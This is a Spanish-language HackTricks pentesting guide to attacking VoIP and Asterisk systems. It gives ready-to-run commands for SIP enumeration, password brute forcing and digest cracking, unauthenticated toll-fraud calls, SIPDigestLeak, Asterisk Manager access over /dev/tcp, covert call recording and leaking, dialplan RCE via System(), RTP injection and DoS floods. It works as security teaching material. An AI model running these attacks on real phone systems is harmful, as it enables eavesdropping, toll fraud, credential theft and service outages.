# Pentesting VoIP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica sobre VoIP

Para comenzar a aprender c칩mo funciona VoIP, consulta:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Enumeraci칩n de VoIP

### N칰meros de Tel칠fono

Uno de los primeros pasos que un Equipo Rojo podr칤a realizar es buscar n칰meros de tel칠fono disponibles para contactar con la empresa utilizando herramientas de OSINT, b칰squedas en Google o raspando p치ginas web.

Una vez que tengas los n칰meros de tel칠fono, podr칤as utilizar servicios en l칤nea para identificar el operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios VoIP podr칤a ayudarte a identificar si la empresa est치 utilizando VoIP... Adem치s, es posible que la empresa no haya contratado servicios VoIP pero est칠 utilizando tarjetas PSTN para conectar su propia PBX VoIP a la red telef칩nica tradicional.

Cosas como respuestas autom치ticas de m칰sica generalmente indican que se est치 utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informaci칩n de OSINT

Cualquier otra enumeraci칩n de OSINT que ayude a identificar el software VoIP que se est치 utilizando ser치 칰til para un Equipo Rojo.

### Enumeraci칩n de Red

- **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se est치n escaneando, es muy lento y puede que no sea muy preciso con este tipo de servicios.
- **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localizar치 servicios SIP en la red indicada.
- `svmap` es **f치cil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero podr칤as modificar el c칩digo desde `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan es un esc치ner muy r치pido para servicios SIP sobre UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar f치cilmente un rango de puertos, escanear tanto TCP como UDP, utilizar otro m칠todo (por defecto usar치 OPTIONS) y especificar un User-Agent diferente (y m치s).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeraci칩n adicional de la red

El PBX tambi칠n podr칤a estar exponiendo otros servicios de red como:

- **69/UDP (TFTP)**: Actualizaciones de firmware
- **80 (HTTP) / 443 (HTTPS)**: Para gestionar el dispositivo desde la web
- **389 (LDAP)**: Alternativa para almacenar la informaci칩n de los usuarios
- **3306 (MySQL)**: Base de datos MySQL
- **5038 (Manager)**: Permite usar Asterisk desde otras plataformas
- **5222 (XMPP)**: Mensajes utilizando Jabber
- **5432 (PostgreSQL)**: Base de datos PostgreSQL
- 춰Y otros...

### Enumeraci칩n de m칠todos

Es posible encontrar **qu칠 m칠todos est치n disponibles** para usar en el PBX utilizando `sipenumerate.py` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Enumeraci칩n de Extensiones

Las extensiones en un sistema de PBX (Centralita Privada) se refieren a los **identificadores internos 칰nicos asignados a l칤neas telef칩nicas individuales**, dispositivos o usuarios dentro de una organizaci칩n o empresa. Las extensiones permiten **enrutar llamadas dentro de la organizaci칩n de manera eficiente**, sin la necesidad de n칰meros de tel칠fono externos individuales para cada usuario o dispositivo.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un esc치ner de l칤neas de extensi칩n de PBX SIP gratuito. En concepto, funciona de manera similar a los wardialers tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identifica extensiones en un servidor SIP. Sipexten puede verificar grandes rangos de red y puertos.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Tambi칠n puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de fuerza bruta de nombres de usuario del protocolo de intercambio de Asterisk (IAX). enumIAX puede operar en dos modos distintos; Adivinanza secuencial de nombres de usuario o Ataque de diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### Fuerza Bruta de Contrase침as

Una vez descubierto el **PBX** y algunos **extensiones/nombres de usuario**, un Equipo Rojo podr칤a intentar **autenticarse a trav칠s del m칠todo `REGISTER`** en una extensi칩n utilizando un diccionario de contrase침as comunes para realizar un ataque de fuerza bruta a la autenticaci칩n.

{% hint style="danger" %}
Ten en cuenta que un **nombre de usuario** puede ser el mismo que la extensi칩n, pero esta pr치ctica puede variar dependiendo del sistema PBX, su configuraci칩n y las preferencias de la organizaci칩n...

Si el nombre de usuario no es el mismo que la extensi칩n, deber치s **averiguar el nombre de usuario para realizar el ataque de fuerza bruta**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack te permite crackear la contrase침a para un nombre de usuario/extensi칩n espec칤fico en un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack es una herramienta para crackear las autenticaciones digest dentro del protocolo SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podr칤as **capturar toda la informaci칩n**. Adem치s, si est치s dentro de una red m치s cerrada (conectado a trav칠s de Ethernet o Wifi protegida) podr칤as realizar **ataques de MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre la **PBX y la pasarela** para capturar la informaci칩n.

Entre la informaci칩n de red, podr칤as encontrar **credenciales web** para gestionar el equipo, **extensiones de usuario**, **nombre de usuario**, direcciones **IP**, incluso **contrase침as hasheadas** y **paquetes RTP** que podr칤as reproducir para **escuchar la conversaci칩n**, y m치s.

Para obtener esta informaci칩n podr칤as utilizar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para capturar conversaciones de VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Ten en cuenta que si se utiliza **TLS en la comunicaci칩n SIP** no podr치s ver la comunicaci칩n SIP en claro.\
Lo mismo suceder치 si se utiliza **SRTP** y **ZRTP**, los **paquetes RTP no estar치n en texto claro**.
{% endhint %}

#### Credenciales SIP

[Revisa este ejemplo para entender mejor una **comunicaci칩n de registro SIP**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender c칩mo se env칤an las **credenciales**.

* **`sipdump`** & **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** extrae datos del protocolo SIP de un archivo PCAP.
* **SipDump** Extrae autenticaciones de SIP Digest de un archivo PCAP.
* **SIP Digest Crack** es una herramienta para crackear las autenticaciones digest dentro del protocolo SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### C칩digos DTMF

**No solo las credenciales SIP** se pueden encontrar en el tr치fico de red, tambi칠n es posible encontrar c칩digos DTMF que se utilizan, por ejemplo, para acceder al **correo de voz**.\
Es posible enviar estos c칩digos en mensajes **INFO SIP**, en **audio** o dentro de **paquetes RTP**. Si los c칩digos est치n dentro de paquetes RTP, podr칤as cortar esa parte de la conversaci칩n y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Llamadas gratuitas / Configuraciones incorrectas de conexiones de Asterisk

En Asterisk es posible permitir una conexi칩n **desde una direcci칩n IP espec칤fica** o desde **cualquier direcci칩n IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una direcci칩n IP, el host **no necesitar치 enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se env칤a el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el tel칠fono necesitar치 REGISTRARSE cada 30 minutos). Sin embargo, necesitar치 tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

- **`type=user`**: El usuario solo puede recibir llamadas como usuario.
- **`type=friend`**: Es posible realizar llamadas como peer y recibirlas como usuario (usado con extensiones).
- **`type=peer`**: Es posible enviar y recibir llamadas como peer (trunk SIP).

Tambi칠n es posible establecer confianza con la variable insegura:

- **`insecure=port`**: Permite conexiones peer validadas por IP.
- **`insecure=invite`**: No requiere autenticaci칩n para mensajes INVITE.
- **`insecure=port,invite`**: Ambos.

{% hint style="warning" %}
Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no se utilizar치**, por lo que si un administrador **configura incorrectamente un trunk SIP** usando ese valor, **cualquiera podr치 conectarse a 칠l**.

Por ejemplo, esta configuraci칩n ser칤a vulnerable:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Llamadas Gratuitas / Configuraciones Incorrectas de Contexto en Asterisk

En Asterisk, un **contexto** es un contenedor o secci칩n nombrada en el plan de marcaci칩n que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcaci칩n es el componente central de un sistema Asterisk, ya que define **c칩mo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcaci칩n, gestionar el control de acceso y proporcionar separaci칩n entre las diferentes partes del sistema.

Cada contexto se define en el archivo de configuraci칩n, t칤picamente en el archivo **`extensions.conf`**. Los contextos se indican con corchetes, con el nombre del contexto encerrado en ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, se definen extensiones (patrones de n칰meros marcados) y se asocian con una serie de acciones o aplicaciones. Estas acciones determinan c칩mo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "mi\_contexto" con una extensi칩n "100". Cuando alguien marca 100, la llamada ser치 contestada, se reproducir치 un mensaje de bienvenida y luego la llamada ser치 terminada.

Este es **otro contexto** que permite **llamar a cualquier otro n칰mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Cualquier persona podr치 utilizar el **servidor para llamar a cualquier otro n칰mero** (y el administrador del servidor pagar치 por la llamada).
{% endhint %}

{% hint style="danger" %}
Adem치s, de forma predeterminada, el archivo **`sip.conf`** contiene **`allowguest=true`**, por lo que **cualquier** atacante sin **autenticaci칩n** podr치 llamar a cualquier otro n칰mero.
{% endhint %}

*   **`sipinvite.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite comprueba si un **servidor PBX nos permite hacer llamadas sin autenticaci칩n**. Si el servidor SIP tiene una configuraci칩n incorrecta, nos permitir치 hacer llamadas a n칰meros externos. Tambi칠n puede permitirnos transferir la llamada a un segundo n칰mero externo.

Por ejemplo, si su servidor Asterisk tiene una mala configuraci칩n de contexto, puede aceptar solicitudes INVITE sin autorizaci칩n. En este caso, un atacante puede hacer llamadas sin conocer ning칰n usuario/contrase침a.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Llamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnolog칤a de telefon칤a que permite a los usuarios interactuar con un sistema informatizado a trav칠s de voz o tonos t치ctiles. IVRS se utiliza para construir sistemas de **manejo automatizado de llamadas** que ofrecen una variedad de funcionalidades, como proporcionar informaci칩n, dirigir llamadas y capturar la entrada del usuario.

IVRS en sistemas VoIP t칤picamente consta de:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que gu칤an a los usuarios a trav칠s de las opciones del men칰 IVR e instrucciones.
2. **Se침alizaci칩n DTMF** (Tono Dual de Multi-Frecuencia): Entradas de tonos t치ctiles generadas al presionar teclas en el tel칠fono, que se utilizan para navegar por los men칰s IVR y proporcionar entrada.
3. **Enrutamiento de llamadas**: Dirigir llamadas al destino apropiado, como departamentos espec칤ficos, agentes o extensiones basadas en la entrada del usuario.
4. **Captura de entrada de usuario**: Recopilar informaci칩n de los llamantes, como n칰meros de cuenta, IDs de casos u otros datos relevantes.
5. **Integraci칩n con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar informaci칩n, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcaci칩n (archivo **`extensions.conf`**) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y m치s. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar la entrada del usuario y controlar el flujo de la llamada.

#### Ejemplo de configuraci칩n vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El anterior es un ejemplo donde se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **la extensi칩n completa** si la conoce.\
La vulnerabilidad radica en que la **longitud de la extensi칩n indicada no se verifica, por lo que un usuario podr칤a ingresar un n칰mero completo durante el tiempo de espera de 5 segundos y se realizar치 la llamada.**

### Inyecci칩n de Extensi칩n

Utilizando una extensi칩n como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensi칩n** que se va a llamar, cuando se introduzca la **ext 101** esto es lo que suceder칤a:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **m치s que n칰meros** (como en versiones antiguas de Asterisk), un atacante podr칤a introducir **`101&SIP123123123`** para llamar al n칰mero de tel칠fono 123123123. Y este ser칤a el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, una llamada a la extensi칩n **`101`** y **`123123123`** ser치 enviada y solo la primera que reciba la llamada se establecer치... pero si un atacante utiliza una **extensi칩n que evita cualquier coincidencia** que se est칠 realizando pero que no existe, podr칤a **inyectar una llamada solo al n칰mero deseado**.

## SIPDigestLeak

El SIP Digest Leak es una vulnerabilidad que afecta a una gran cantidad de tel칠fonos SIP, incluidos tel칠fonos IP tanto de hardware como de software, as칤 como adaptadores telef칩nicos (de VoIP a anal칩gico). La vulnerabilidad permite la **filtraci칩n de la respuesta de autenticaci칩n Digest**, que se calcula a partir de la contrase침a. Un **ataque de contrase침a sin conexi칩n es entonces posible** y puede recuperar la mayor칤a de las contrase침as basadas en la respuesta al desaf칤o.

**[Escenario de vulnerabilidad desde aqu칤**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un tel칠fono IP (v칤ctima) est치 escuchando en el puerto 5060, aceptando llamadas telef칩nicas
2. El atacante env칤a un INVITE al tel칠fono IP
3. El tel칠fono de la v칤ctima comienza a sonar y alguien contesta y cuelga (porque nadie responde al tel칠fono en el otro extremo)
4. Cuando se cuelga el tel칠fono, el **tel칠fono de la v칤ctima env칤a un BYE al atacante**
5. El **atacante emite una respuesta 407** que **solicita autenticaci칩n** y emite un desaf칤o de autenticaci칩n
6. El **tel칠fono de la v칤ctima proporciona una respuesta al desaf칤o de autenticaci칩n** en un segundo BYE
7. El **atacante puede entonces realizar un ataque de fuerza bruta** en la respuesta al desaf칤o en su m치quina local (o red distribuida, etc.) y adivinar la contrase침a

* **sipdigestleak.py** de [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak explota esta vulnerabilidad.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo podr칤a estar interesado en un producto) **introducir** su **n칰mero de tel칠fono** para ser llamado. Luego se llamar치 a un comercial, y cuando **conteste el tel칠fono** el usuario ser치 **llamado y conectado con el agente**.

Un perfil com칰n de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* El perfil anterior est치 permitiendo que **CUALQUIER direcci칩n IP se conecte** (si se conoce la contrase침a).
* Para **organizar una llamada**, como se especific칩 anteriormente, **no es necesaria** la **lectura de permisos** y solo se necesita **originate** en **write**.

Con esos permisos, cualquier IP que conozca la contrase침a podr칤a conectarse y extraer demasiada informaci칩n, como:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Se podr칤a solicitar m치s informaci칩n o acciones.**

### **Escucha clandestina**

En Asterisk es posible utilizar el comando **`ChanSpy`** indicando la **extensi칩n(es) a monitorear** (o todas) para escuchar conversaciones que est치n ocurriendo. Este comando debe ser asignado a una extensi칩n.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensi칩n 333**, se **monitorear치n** **`todas`** las extensiones, **comenzar치 a escuchar** cuando una nueva conversaci칩n comience (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Puedes pasar de una conversaci칩n a otra presionando **`*`**, o marcando el n칰mero de extensi칩n.

Tambi칠n es posible utilizar **`ExtenSpy`** para monitorear solo una extensi칩n.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** utilizando una extensi칩n como:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Las llamadas se guardar치n en **`/tmp`**.

Incluso podr칤as hacer que Asterisk **ejecute un script que filtrar치 la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** es un importante problema de seguridad que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el tr치fico de **RTP (Protocolo de Tiempo Real)**, que lleva las conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el tr치fico de RTP evita la autenticaci칩n al atravesar los firewalls de NAT (Traducci칩n de Direcciones de Red).

Los proxies de RTP intentan abordar las **limitaciones de NAT** que afectan a los sistemas RTC al hacer de intermediarios en los flujos de RTP entre dos o m치s partes. Cuando hay NAT en su lugar, el software de proxy de RTP a menudo no puede confiar en la informaci칩n de IP y puerto de RTP recuperada a trav칠s de la se침alizaci칩n (por ejemplo, SIP). Por lo tanto, varios proxies de RTP han implementado un mecanismo donde dicho **tuplet de IP y puerto se aprende autom치ticamente**. Esto se hace a menudo inspeccionando el tr치fico de RTP entrante y marcando la IP y puerto de origen para cualquier tr치fico de RTP entrante como el que deber칤a ser respondido. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ning칰n tipo de autenticaci칩n**. Por lo tanto, los **atacantes** pueden **enviar tr치fico de RTP al proxy de RTP** y recibir el tr치fico de RTP intermediado destinado al llamante o al llamado de un flujo de RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios de RTP destinados a ser enviados a usuarios leg칤timos.

Otro comportamiento interesante de los proxies de RTP y las pilas de RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, aceptar치n, reenviar치n y/o procesar치n paquetes de RTP de cualquier origen. Por lo tanto, los atacantes pueden enviar paquetes de RTP que les permitan inyectar sus medios en lugar de los leg칤timos. Llamamos a este ataque Inyecci칩n de RTP porque permite la inyecci칩n de paquetes de RTP ileg칤timos en flujos de RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies de RTP como en puntos finales.

Asterisk y FreePBX han utilizado tradicionalmente el ajuste **`NAT=yes`**, que permite que el tr치fico de RTP evite la autenticaci칩n, lo que potencialmente conduce a la falta de audio o audio unidireccional en las llamadas.

Para obtener m치s informaci칩n, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos de RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos de RTP
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP (desde un archivo de audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

En Asterisk, si de alguna manera logras **agregar reglas de extensi칩n y recargarlas** (por ejemplo, comprometiendo un servidor de administraci칩n web vulnerable), es posible obtener RCE utilizando el comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Existe un comando llamado **`Shell`** que se puede usar **en lugar de `System`** para ejecutar comandos del sistema si es necesario.

{% hint style="warning" %}
Si el servidor est치 **prohibiendo el uso de ciertos caracteres** en el comando **`System`** (como en Elastix), verifica si el servidor web permite **crear archivos de alguna manera dentro del sistema** (como en Elastix o trixbox), y 칰salo para **crear un script de puerta trasera** y luego usa **`System`** para **ejecutar** ese **script**.
{% endhint %}

#### Archivos locales interesantes y permisos

* **`sip.conf`** -> Contiene la contrase침a de los usuarios SIP.
* Si el **servidor Asterisk se est치 ejecutando como root**, podr칤as comprometer el root.
* El **usuario root de mysql** podr칤a **no tener contrase침a**.
* Esto podr칤a usarse para crear un nuevo usuario de mysql como puerta trasera.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la contrase침a del administrador del panel web (FreePBX).
* **`FreePBX.conf`** -> Contiene la contrase침a del usuario FreePBXuser utilizado para acceder a la base de datos.
* Esto podr칤a usarse para crear un nuevo usuario de mysql como puerta trasera.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene varias contrase침as en texto claro como la contrase침a de root de mysql, la contrase침a de IMAPd, la contrase침a de administrador web.
* **Varias carpetas** pertenecer치n al usuario de Asterisk comprometido (si no se est치 ejecutando como root). Este usuario puede leer los archivos anteriores y tambi칠n controla la configuraci칩n, por lo que podr칤a hacer que Asterisk cargue otros binarios con puertas traseras cuando se ejecuten.

### Inyecci칩n de RTP

Es posible insertar un **`.wav`** en conversaciones usando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O podr칤as usar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un `.wav` a una conversaci칩n (**`rtpsend.pl`**) e **insertar ruido** en una conversaci칩n (**`rtpflood.pl`**).

### DoS

Existen varias formas de intentar lograr un DoS en servidores VoIP.

* **`sipflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ env칤a mensajes ilimitados al objetivo.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS al protocolo IAX utilizado por Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE sobre UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Env칤a varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se est치n utilizando (primero sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar tr치fico SIP, por lo que tambi칠n se puede usar para DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Navaja suiza SIP. Tambi칠n se puede usar para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nos permite enviar un **mensaje SIP personalizado** y analizar la respuesta.
* **`wssend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nos permite enviar un mensaje SIP personalizado sobre WebSockets y analizar la respuesta.

### Vulnerabilidades del sistema operativo

La forma m치s sencilla de instalar un software como Asterisk es descargar una **distribuci칩n de SO** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que est칠n funcionando, los administradores de sistemas podr칤an **no actualizarlos nuevamente** y con el tiempo se descubrir치n **vulnerabilidades**.

## Referencias

